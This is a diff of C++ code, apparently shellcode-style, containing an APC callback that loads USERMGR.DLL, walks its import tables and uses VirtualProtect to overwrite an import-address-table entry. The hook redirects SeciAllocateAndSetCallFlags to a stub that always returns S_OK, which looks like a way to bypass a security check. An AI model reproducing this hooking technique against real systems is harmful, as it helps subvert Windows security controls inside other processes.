@@ -1,7 +1,7 @@
 #include "stdafx.h"
 
 //#define _PRINT_CPP_NAMES_
-#include "../ScEntry/asmfunc.h"
+#include "../ScEntry/address.h"
 
 DWORD HashString(PCSTR lpsz, DWORD hash = 0)
 {
@@ -29,15 +29,13 @@ MySeciAllocateAndSetCallFlags(_In_ ULONG dwFlags, _Out_ PBOOL FreeCallContext)
 	return S_OK;
 }
 
-void* MySeciAllocateAndSetCallFlagsAddr()ASM_FUNCTION;
-
 #include <C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.41.34120\include\delayimp.h>
 
 void NTAPI OnApc(_In_ ULONG rvaINT, _In_ ULONG rvaIAT, _In_ PVOID hmod)
 {
 	CPP_FUNCTION;
 
-	if (hmod = LoadLibraryW(L"USERMGR.DLL"))
+	if (hmod = LoadLibraryW(_YW(L"USERMGR.DLL")))
 	{
 		USHORT e[] = { IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT, IMAGE_DIRECTORY_ENTRY_IMPORT };
 		ULONG d[] = { sizeof(ImgDelayDescr), sizeof(IMAGE_IMPORT_DESCRIPTOR) };
@@ -100,10 +98,10 @@ void NTAPI OnApc(_In_ ULONG rvaINT, _In_ ULONG rvaIAT, _In_ PVOID hmod)
 										ULONG op;
 										if (VirtualProtect(ppv, sizeof(void*), PAGE_READWRITE, &op))
 										{
-											*ppv = MySeciAllocateAndSetCallFlagsAddr();
+											*ppv = _Y(&MySeciAllocateAndSetCallFlags);
 											if (PAGE_READWRITE != op) VirtualProtect(ppv, sizeof(void*), op, &op);
 										}
-										return ;
+										return;
 									}
 								}
 								pitd++;
@@ -117,4 +115,3 @@ void NTAPI OnApc(_In_ ULONG rvaINT, _In_ ULONG rvaIAT, _In_ PVOID hmod)
 		} while (i);
 	}
 }
-
